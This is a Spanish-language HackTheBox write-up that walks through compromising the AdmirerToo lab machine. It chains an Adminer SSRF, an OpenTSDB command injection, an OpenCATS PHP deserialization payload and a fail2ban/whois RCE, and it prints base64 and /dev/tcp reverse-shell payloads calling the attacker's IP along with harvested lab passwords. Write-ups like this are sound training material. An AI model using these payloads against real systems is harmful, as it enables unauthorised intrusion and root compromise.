---
title: HackTheBox - Maquina AdmirerToo 
subtitle: Paso a paso de la explotación de la máquina AdmirerToo de HackTheBox.
dificultad: Hard
os: Sistema Operativo Linux
date: 2024-02-08
tags:
    - HackTheBox
---

## Enumeración de Puertos

Enumeración de puertos TCP
~~~bash
sudo nmap -sS -p22,80,4242,4329 10.129.96.181 -A
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:50 EDT
Nmap scan report for 10.129.96.181
Host is up (0.14s latency).

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp   open     http           Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
4242/tcp filtered vrml-multi-use
4329/tcp closed   publiqare-sync
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/16%OT=22%CT=4329%CU=36711%PV=Y%DS=2%DC=T%G=Y%TM=62AB
OS:435C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505
OS:ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 4329/tcp)
HOP RTT       ADDRESS
1   136.94 ms 10.10.14.1
2   137.13 ms 10.129.96.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.52 seconds

~~~

## Enumeración de Servicios  

**Puerto 80 (HTTP)**:

![](/AdmirerToo/Pasted_image_20220616103908.png)

Intentamos acceder al archivo robots.txt. Nos encontramos con un error 404, en donde es indicado el dominio admirer-gallery.htb. Por lo que agregamos este dominio a nuestro archivo /etc/hosts

~~~http
HTTP/1.1 404 Not Found
Date: Thu, 16 Jun 2022 14:59:54 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 326
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at <a href="mailto:webmaster@admirer-gallery.htb">10.129.96.181</a> Port 80</address>
</body></html>

~~~

Luego de hacer una enumeración del sistema, intentamos encontrar subdominios o VHOSTS en el servidor con gobuster:

~~~bash
gobuster vhost  -u http://admirer-gallery.htb -w Repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://admirer-gallery.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     Repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/06/16 11:07:18 Starting gobuster in VHOST enumeration mode
===============================================================
Found: db.admirer-gallery.htb (Status: 200) [Size: 2568]
                                                        
===============================================================
2022/06/16 11:08:29 Finished
===============================================================
~~~

Verificamos el contenido del dominio db.admirer-gallery.htb

![](/AdmirerToo/Pasted_image_20220616111424.png)

La version del software es Admirer 4.7.8

Si presionamos sobre el botón Enter (sin la necesidad de ingresar credenciales)  lograremos obtener unas credenciales de acceso a admirer 

~~~http
POST / HTTP/1.1
Host: db.admirer-gallery.htb
Content-Length: 162
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://db.admirer-gallery.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://db.admirer-gallery.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: adminer_sid=ssbd0ec7vb6kjntrvjfm3pcu1m; adminer_key=ca210dee4291ea9afbb692e9291dfefb; adminer_version=4.8.1
Connection: close

auth%5Bdriver%5D=server&auth%5Bserver%5D=localhost&auth%5Busername%5D=admirer_ro&auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&auth%5Bdb%5D=admirer&auth%5Bpermanent%5D=1
~~~

Datos recolectados:

- **User**: admirer_ro
- **Password**: 1w4nn4b3adm1r3d2!




## Analisis de vulnerabilidades

Admirer 4.7.8 es vulnerable a ataques SSRF (CVE-2021-21311). El documento que explica como explotar esta vulnerabilidad es el siguiente:

https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf

Para la prueba de concepto es utilizado el siguiente script en python

https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd

No sabemos cual es valor de campo auth[driver] en la request POST por lo que lo buscaremos usando docker y una imagen de admirer 4.7.8

Ejecutamos los siguientes comandos:


~~~bash
docker pull adminer:4.7.8
~~~

~~~bash
sudo docker run  -p 8082:8080 adminer:4.7.8
~~~

Luego con burpsuite intentamos modificar los parámetros de login al sistema y enviamos una request POST

![](/AdmirerToo/Pasted_image_20220616120347.png)

La request es la siguiente:

~~~http
POST / HTTP/1.1
Host: localhost:8082
Content-Length: 114
Cache-Control: max-age=0
sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8082
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8082/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: adminer_sid=efb4f07c4acae53848f88ecf3b2a81ad; adminer_key=f716493939fc48b347d7a7752a301860; adminer_version=4.8.1
Connection: close

auth%5Bdriver%5D=elastic&auth%5Bserver%5D=db&auth%5Busername%5D=admin&auth%5Bpassword%5D=admin&auth%5Bdb%5D=asdasd
~~~

El payload que utilizaremos será:

~~~
auth%5Bdriver%5D=elastic&auth%5Bserver%5D=10.10.14.28&auth%5Busername%5D=admin&auth%5Bpassword%5D=admin&auth%5Bdb%5D=asdasd
~~~

Ejecutamos el script hecho en python (es importante agregar el protocolo en la url de redirección, sino no funcionará)

~~~bash
python2.7 redirect.py --ip 10.10.14.28 --port 80 http://google.com
serving at port 80
~~~

Finalmente en la consola vemos el siguiente resultado:

![](/AdmirerToo/Pasted_image_20220616134824.png)

y la  respuesta de la aplicación web es:

![](/AdmirerToo/Pasted_image_20220616134846.png)

Al parecer no puede hacer solicitudes a sistemas externos a la red

Vamos a hacer una nueva solicitud, pero esta vez será a la página index de admirer

~~~bash
python2.7 redirect.py --ip 10.10.14.28 --port 80 http://10.129.96.181/index.php
serving at port 80
~~~

Como resultado en la aplicación admirer vemos el contenido HTML del Virtual HOST admirer-gallery.htb

![](/AdmirerToo/Pasted_image_20220616135151.png)


Intentaremos acceder al puerto 4242 de la máquina objetivo mediante esta vulnerabilidad y logramos obtener la siguiente información:

![](/AdmirerToo/Pasted_image_20220616164702.png)

El servicio en el puerto 4242 es OpenTSDB, por lo que buscamos información la aplicación OpenTSDB

La siguiente página menciona un RCE ( CVE-2020-35476) para la aplicación OpenTSDB, esta vulnerabilidad solo está presente en en las versiones 2.4.0 o menos.

https://github.com/OpenTSDB/opentsdb/issues/2051

Usamos el payload descrito en el link anterior y ponemos el script python para redireccionar request a la esucha en el puerto 80.

~~~bash
python2.7 redirect.py --port 80 --ip 10.10.14.28 "http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
~~~

Como respuesta el sistema nos entrega un error

![](/AdmirerToo/Pasted_image_20220616172852.png)

El error termina con la linea:

~~~
No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450)
~~~

Este error nos indica que esta métrica no existe en el sistema, por lo que debemos identificar que otras métricas tiene disponible. Un post en Buffer overflow nos sugiere una solución:

https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http

Ponemos el script python a la escucha de la siguiente forma

~~~bash
python2.7 redirect.py --port 80 --ip 10.10.14.28 "http://10.129.96.181:4242/api/suggest?type=metrics&max=10" 
~~~

Luego de ejecutar el exploit el sistema nos entrega el siguiente resultado:

![](/AdmirerToo/Pasted_image_20220616184008.png)

~~~
http.stats.web.hits
~~~

Utilizaremos esta metrica para explotar el RCE

## Explotation
~~~bash
python2.7 redirect.py --port 80 --ip 10.10.14.28 "http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
~~~

Al parecer funcionó correctamente, ya que el mensaje entregado es completamente nuevo.

![](/AdmirerToo/Pasted_image_20220616184219.png)

## Obteniendo una Shell

Ahora intentamos obtener una shell reversa:

Enviaremos nuestro payload codificado en base64:

~~~bash
echo "/bin/bash -l > /dev/tcp/10.10.14.28/443 0<&1 2>&1" | base64
~~~

El payload final sera el siguiente

~~~bash
echo+\"L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMjgvNDQzIDA8JjEgMj4mMQo=\"|base64+-d|bash
~~~

Finalmente agregamos nuestro payload al script que explota la vulnerabilidad de OpenTSDB

~~~bash
python2.7 redirect.py --port 80 --ip 10.10.14.28 "http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo+\"L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMjgvNDQzIDA8JjEgMj4mMQo=\"|base64+-d|bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
~~~



![](/AdmirerToo/Pasted_image_20220616192757.png)


## Enumeracion de sistemas

Enumeramos el directorio /var/www/adminer/plugins/data, dónde encontramos el archivo servers.php y su contenido es:

~~~php
<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];

~~~

Posibles credenciales

- **Password**: 1w4nn4b3adm1r3d2!
- **Password**: bQ3u7^AxzcB7qAsxE3

Identificamos los usuarios del sistema:

~~~bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
opentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false
jennifer:x:1002:100::/home/jennifer:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
~~~


Intentamos acceder a la máquina mediante SSH con las siguientes credenciales:

- **Usuario**: jennifer
- **Password**: bQ3u7^AxzcB7qAsxE3

### Enumeración como Jennifer

![](/AdmirerToo/Pasted_image_20220616194251.png)

Logramos acceso al sistema

Identificamos los puertos abiertos con netstat -ano

~~~bash
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 10.129.96.181:55074     10.10.14.28:443         CLOSE_WAIT  off (0.00/0/0)
tcp        0     36 10.129.96.181:22        10.10.14.28:47588       ESTABLISHED on (0.34/0/0)
tcp6       0      0 :::16030                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::16010                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::4242                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.0.1:2181          127.0.0.1:43884         ESTABLISHED off (0.00/0/0)
tcp6       0      0 127.0.1.1:16000         127.0.1.1:37563         ESTABLISHED keepalive (5315.17/0/0)
tcp6       0      0 127.0.0.1:2181          127.0.0.1:43894         ESTABLISHED off (0.00/0/0)
tcp6       0      0 127.0.0.1:51310         127.0.1.1:16020         TIME_WAIT   timewait (31.89/0/0)
tcp6       0      0 127.0.0.1:43910         127.0.0.1:2181          ESTABLISHED off (0.00/0/0)
~~~

Notamos un servicio corriendo en el puerto 8080. Intentamos acceder con Curl a la aplicación identificandola como OpenCATS  versión  0.9.5.2

### Opencats

Identificamos una potencial vulnerabilidad (CVE-2021-25294) en el siguiente link:

https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html

Hacemos un port forwarding con los siguientes comandos

![](/AdmirerToo/Pasted_image_20220616232051.png)

Finalmente accedermos a la pagina en nuestra maquina local

![](/AdmirerToo/Pasted_image_20220616232118.png)

Ingresamos al sistema con las credenciales de jennifer

- **Usuario**: jennifer
- **Password**: bQ3u7^AxzcB7qAsxE3


### Fail2ban

File2ban es una herramienta que evita el uso de ataques de fuerza bruta baneando la correspondiente IP.

En el directorio /etc identificamos el software fail2ban, este posee una vulnerabilidad (CVE-2021-32749) RCE basado en otros dos software mail y whois. Este último usa un archivo de configuración en el directorio /usr/local/etc

https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm 

## Elevación de privilegios

Primero intentamos crear el archivo whois.conf en el directorio /usr/local/etc con la vulnerabilidad de opencats


creamos el archivo whois.conf basados en el siguiente (ejemplo)[https://gist.github.com/thde/3890aa48e03a2b551374]

~~~
##
# WHOIS servers for new TLDs (http://www.iana.org/domains/root/db)
# Current as of 2017-12-10 UTC
##

\.aarp$ whois.nic.aarp
\.abarth$ whois.afilias-srs.net
\.abbott$ whois.afilias-srs.net
\.abbvie$ whois.afilias-srs.net
\.abc$ whois.nic.abc
\.abogado$ whois.nic.abogado
\.abudhabi$ whois.nic.abudhabi
~~~

Notamos que la primera parte es una expresión regular mientras que la segunda es el DNS del respectivo TLD


Nuestro archivo es:

~~~
10.10.14.8 10.10.14.8
~~~

Descargamos la herramienta (phpgcc)[https://github.com/ambionics/phpggc] y ejecutamos el siguiente comando

~~~bash
phpggc/phpggc  -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf
~~~

Nos da como resultado lo siguiente:

~~~bash
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.8+10.10.14.8%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
~~~

Luego en el navegador hacemos una request

~~~
http://localhost:8888//index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.8+10.10.14.8%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
~~~

Luego verificamos que el archivo ha sido creado exitosamente, pero su contenido no es el deseado

![](/AdmirerToo/Pasted_image_20220617210535.png)

Modificamos su contenido del archivo whois.conf:

~~~
]*10.10.14.8 10.10.14.8 #
~~~

La modificación se debe a que el primer campo es una expresión regular como vimos en el archivo de ejemplo mas arriba. Por lo que, podemos obviar esta expresión agregando el caracter de cierre de cochetes junto con un asterisco.

Luego de hacer el proceso anterior  vemos que el resultado es:

~~~bash
cat whois.conf                                                                                                                           
[{"Expires":1,"Discard":false,"Value":"]*10.10.14.8 10.10.14.8 #\n"}]
~~~

Con el objetivo de verificar usamos el comando whois y falla

![](/AdmirerToo/Pasted_image_20220617211358.png)

Revisamos el código fuente de whois para entender como procesa el archivo de configuración whois.conf

https://github.com/rfc1036/whois/blob/next/whois.c

Vamos a la función match_config_file

![](/AdmirerToo/Pasted_image_20220617211541.png)

Vemos que tiene un buffer de 512 caracters, eso quiere decir que si agregamos espacios para evitar que los caracteres #\n" sean agregados al buffer el comando puede funcionar

El nuevo payload será el siguiente:

~~~
http://localhost:8888//index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A539%3A%22%5D%2A10.10.14.8+10.10.14.8+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%23+%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
~~~

Luego de modificar el archivo volvemos a probar el comando whois:

Ponemos el puerto 43 a al escucha:

~~~bash
nc -lnvp 43 
listening on [any] 43 ...

~~~

Ejecutamos el comando whois

~~~bash
whois 10.10.14.8
~~~

Y en nuestra maquian obvervamos lo siguiente:

~~~
nc -lnvp 43 
listening on [any] 43 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.96.181] 40666
10.10.14.8
~~~

Ahora debemos explotar  el RCE de fail2ban. Esto lo logramos de la siguiente forma

Ponemos el puerto 43 a la escucha junto con la entrega del payload para el reverse shell
~~~bash
echo -e "\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.8/443 0>&1'\n" | ncat -lnvp 43
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::43
Ncat: Listening on 0.0.0.0:43

~~~

Ponemos el puerto 443 a la escucha de la shell

~~~
nc lnvp 443
~~~

Finalmente intentamos acceder al sistema admirertoo mediante ssh con el usuario root y sin ingresar ninguna contraseña

~~~
ssh root@10.129.96.181
~~~

Luego del tercer intento, obtenemos una shell como root

~~~bash
nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.89.36.
Ncat: Connection from 10.129.89.36:37446.
bash: cannot set terminal process group (1762): Inappropriate ioctl for device
bash: no job control in this shell
root@admirertoo:/# whoami
whoami
root
root@admirertoo:/# 
~~~


